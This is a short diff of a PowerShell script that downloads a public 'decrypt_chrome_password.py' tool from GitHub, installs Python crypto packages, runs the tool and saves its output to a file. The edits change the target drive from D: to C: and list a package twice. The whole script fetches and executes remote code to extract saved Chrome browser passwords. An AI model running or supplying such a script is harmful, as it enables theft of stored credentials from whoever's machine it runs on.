@@ -2,7 +2,7 @@
 $scriptUrl = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py"
 
 # Define the directory where you want to download the script
-$scriptDir = "D:\"
+$scriptDir = "C:\"
 $scriptPath = Join-Path -Path $scriptDir -ChildPath "decrypt_chrome_password.py"
 
 # Define the output file path
@@ -12,7 +12,7 @@ $outputFilePath = Join-Path -Path $scriptDir -ChildPath "output.txt"
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
 
 # Install required Python packages
-pip install pypiwin32 pycryptodome
+pip install pypiwin32 pycryptodomex pycryptodomex
 
 # Execute the Python script and store the output
 $output = python $scriptPath
